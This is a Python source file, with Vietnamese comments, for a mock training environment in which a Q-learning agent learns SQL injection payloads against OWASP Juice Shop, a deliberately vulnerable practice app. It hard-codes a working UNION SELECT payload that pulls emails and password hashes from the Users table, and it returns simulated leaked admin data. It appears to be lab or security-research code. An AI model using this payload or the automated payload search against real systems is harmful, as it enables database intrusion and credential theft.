from src.environment.base_environment import BaseEnvironment
from src.core.action_space import ActionSpace
from src.core.reward_system import RewardSystem
from src.core.state_manager import StateManager  # Nếu chưa có, tạo file src/core/state_manager.py như dưới
import configparser
import json
import re

# Nếu chưa có StateManager, tạo file src/core/state_manager.py với nội dung này:
# class StateManager:
#     def __init__(self):
#         self.current_state = ""
#
#     def get_current_state(self):
#         return self.current_state
#
#     def reset_state(self):
#         self.current_state = ""
#         return self.current_state
#
#     def update_state(self, action_string):
#         self.current_state += action_string
#         return self.current_state

class TrainingEnvironment(BaseEnvironment):
    """
    Môi trường training mock cho Q-learning, simulate Juice Shop response.
    Dùng để train agent offline nhanh, sau transfer sang TargetEnvironment.
    """
    def __init__(self, config_file):
        config = configparser.ConfigParser()
        config.read(config_file, encoding='utf-8')
        
        train_cfg = config['Training']  # Thêm section [Training] vào config.ini nếu chưa có
        env_cfg = config['Environment']

        # Config mock responses
        self.success_marker = train_cfg.get('success_marker', 'admin@juice-sh.op')  # Từ baseline curl
        self.error_marker = train_cfg.get('sql_error_marker', 'SQLITE_ERROR')  # Fake error
        self.normal_count = int(env_cfg['normal_result_count'])
        
        # Khởi tạo components
        self.action_space = ActionSpace()
        self.state_manager = StateManager()
        self.reward_system = RewardSystem(
            normal_count=self.normal_count,
            success_marker=self.success_marker,
            error_marker=self.error_marker
        )
        print("[TrainingEnvironment] Đã khởi tạo môi trường mock cho training.")

    def reset(self):
        """Reset state về rỗng."""
        return self.state_manager.reset_state()

    def step(self, action_index):
        """Thực hiện action, simulate response, tính reward."""
        # 1. Lấy action string
        action_string = self.action_space.get_action_string(action_index)
        
        # 2. Update state (nối payload)
        new_state = self.state_manager.update_state(action_string)
        
        # 3. Simulate HTTP response dựa trên payload (extract string nếu hash)
        payload_str = self._get_payload_string(new_state)  # New helper
        response = self._simulate_response(payload_str)
        
        # 4. Tính reward & done
        reward, done = self.reward_system.calculate_reward(response, payload_str)  # Pass str to reward
        
        return new_state, reward, done  # Return hash/tuple state for Q-table

    def _get_payload_string(self, state):
        """Extract full string payload từ state (hash or str)."""
        if len(state) == 32 and all(c in '0123456789abcdef' for c in state):  # Likely MD5 hash
            return self.state_manager.get_current_state()  # Full from manager
        return state  # Already str

    def _simulate_response(self, payload):
        """
        Simulate JSON response giống Juice Shop.
        - Nếu payload có 'UNION SELECT ... Users--' → success leak.
        - Nếu syntax sai (e.g., thiếu đóng ngoặc) → error 500.
        - Else → normal products.
        """
        # Check cho baseline success (từ curl của mày)
        baseline_pattern = r"a\'\)\)\s*UNION\s*SELECT\s*id,email,password,NULL,NULL,NULL,NULL,NULL,NULL\s*FROM\s*Users--"
        if re.search(baseline_pattern, payload, re.IGNORECASE):
            # Success: Leak admin data
            fake_data = {
                "status": "success",
                "data": [{
                    "id": 1,
                    "name": "admin@juice-sh.op",
                    "description": "0192023a7bbd73250516f069df18b500d",  # MD5 admin123
                    "price": None, "deluxePrice": None, "image": None,
                    "createdAt": None, "updatedAt": None, "deletedAt": None
                }]
            }
            return type('Response', (), {
                'status_code': 200,
                'text': json.dumps(fake_data),
                'headers': {}
            })()
        
        # Check error (e.g., unbalanced quotes hoặc invalid SQL)
        if "'" in payload and payload.count("'") % 2 != 0:  # Odd number of quotes → syntax error
            return type('Response', (), {
                'status_code': 500,
                'text': '{"error": "SQLITE_ERROR: syntax error"}',
                'headers': {}
            })()
        
        # Normal: Fake products
        fake_products = [{"id": i, "name": f"Product {i}", "description": "Normal desc"} for i in range(self.normal_count)]
        fake_data = {"status": "success", "data": fake_products}
        return type('Response', (), {
            'status_code': 200,
            'text': json.dumps(fake_data),
            'headers': {}
        })()

    def test_baseline(self):
        """
        Test với baseline payload từ curl, dùng làm seed cho training.
        Trả về (state, reward, done) nếu success.
        """
        baseline_payload = "a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--"
        self.state_manager.reset_state()
        new_state = self.state_manager.update_state(baseline_payload)
        payload_str = self._get_payload_string(new_state)  # Extract str
        response = self._simulate_response(payload_str)
        reward, done = self.reward_system.calculate_reward(response, payload_str)
        print(f"[Baseline Test] Payload: {baseline_payload} | Reward: {reward} | Done: {done}")
        return new_state, reward, done

    def get_action_space_size(self):
        """Số action từ ActionSpace."""
        return self.action_space.get_action_space_size()